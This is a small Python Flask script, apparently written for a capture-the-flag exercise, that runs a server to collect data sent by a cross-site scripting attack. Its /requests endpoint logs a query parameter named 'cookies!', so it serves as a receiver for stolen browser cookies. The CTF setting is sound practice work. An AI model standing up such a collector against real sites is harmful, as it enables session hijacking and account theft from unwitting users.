# Simply python server to receive XSS data made via the CTF site
# Python 3
# USin Flask Restful
# Thank you to this: https://programminghistorian.org/en/lessons/creating-apis-with-python-and-flask

import flask
from flask import request, jsonify

app = flask.Flask(__name__)
app.config["DEBUG"] = True

# Some star wars fun!

@app.route('/', methods=['GET'])
def home():
    return '''<h1>Nothing to see here...</h1>
<p>These are not the droids you are looking for...</p>'''


# print the received data to the logs
@app.route('/requests', methods=['GET'])
def api_all():
    print(request.args["cookies!"]);
    return "Thank you!"

app.run()